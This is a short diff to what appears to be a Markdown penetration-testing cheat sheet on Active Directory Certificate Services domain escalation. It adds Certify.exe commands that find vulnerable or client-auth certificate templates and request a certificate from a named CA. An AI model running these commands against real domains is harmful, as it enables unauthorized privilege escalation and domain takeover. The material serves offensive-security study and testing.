@@ -1377,6 +1377,11 @@ _So, if an attacker can specify an arbitrary SAN when requesting a certificate t
 
 _Domain escalation scenarios can result from various AD CS template misconfigurations that allow unprivileged users to supply an arbitrary SAN in a certificate enrollment._
 
+```Certify.exe find /clientauth``` -  will query LDAP for available templates that we can examine for our desired criteria:
+
+```Certify.exe request /ca:dc.ecorcp.com\ecorp-dc-ca /template:user```
+
+Attack flow -
 
 ```./certify.exe find /vulnerable```
 
